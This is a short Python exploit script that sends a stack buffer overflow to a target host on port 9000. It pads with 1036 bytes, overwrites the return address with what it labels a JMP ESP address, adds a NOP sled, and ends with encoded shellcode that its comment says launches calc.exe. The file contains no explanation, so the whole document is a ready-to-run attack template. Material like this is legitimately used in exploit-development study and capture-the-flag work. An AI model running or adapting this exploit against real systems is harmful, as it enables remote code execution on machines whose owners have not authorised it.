import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

# EXECUTING CALC.EXE 
# x86/shikata_ga_nai chosen with final size 220

shellcode = ("\xd9\xee\xba\xce\x20\xd3\xd4\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x31\x83\xc0\x04\x31\x50\x14\x03\x50\xda\xc2\x26\x28\x0a\x80"
"\xc9\xd1\xca\xe5\x40\x34\xfb\x25\x36\x3c\xab\x95\x3c\x10\x47"
"\x5d\x10\x81\xdc\x13\xbd\xa6\x55\x99\x9b\x89\x66\xb2\xd8\x88"
"\xe4\xc9\x0c\x6b\xd5\x01\x41\x6a\x12\x7f\xa8\x3e\xcb\x0b\x1f"
"\xaf\x78\x41\x9c\x44\x32\x47\xa4\xb9\x82\x66\x85\x6f\x99\x30"
"\x05\x91\x4e\x49\x0c\x89\x93\x74\xc6\x22\x67\x02\xd9\xe2\xb6"
"\xeb\x76\xcb\x77\x1e\x86\x0b\xbf\xc1\xfd\x65\xbc\x7c\x06\xb2"
"\xbf\x5a\x83\x21\x67\x28\x33\x8e\x96\xfd\xa2\x45\x94\x4a\xa0"
"\x02\xb8\x4d\x65\x39\xc4\xc6\x88\xee\x4d\x9c\xae\x2a\x16\x46"
"\xce\x6b\xf2\x29\xef\x6c\x5d\x95\x55\xe6\x73\xc2\xe7\xa5\x19"
"\x15\x75\xd0\x6f\x15\x85\xdb\xdf\x7e\xb4\x50\xb0\xf9\x49\xb3"
"\xf5\xf6\x03\x9e\x5f\x9f\xcd\x4a\xe2\xc2\xed\xa0\x20\xfb\x6d"
"\x41\xd8\xf8\x6e\x20\xdd\x45\x29\xd8\xaf\xd6\xdc\xde\x1c\xd6"
"\xf4\xbc\xc3\x44\x94\x6c\x66\xed\x3f\x71")

buffer = "A" * 1036
buffer += "\xEB\x3C\x9D\x74" # JMP ESP
buffer += "\x90" * 50 # NOP SLED
buffer += shellcode # ESP

sock.send(buffer)

sock.close()